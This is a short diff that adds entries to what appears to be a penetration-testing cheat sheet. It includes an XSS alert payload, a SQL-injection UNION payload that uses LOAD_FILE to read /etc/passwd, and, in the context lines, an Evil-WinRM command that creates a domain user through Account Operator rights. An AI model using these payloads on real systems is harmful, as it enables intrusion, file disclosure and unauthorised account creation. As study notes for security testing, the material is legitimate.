@@ -655,3 +655,10 @@ Windows Priv Esc:
   sometimes 'svc-service account' are memeber of "Account Operator" which allows to create new user:
     *Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> net user adib adib1234 /add /domain
    Please check forest.sh
+
+XSS Injection:
+ <script>alert(document.domain);</script>
+
+SQL QUERY:
+ Load File
+ '+UNION+SELECT+LOAD_FILE("/etc/passwd")#
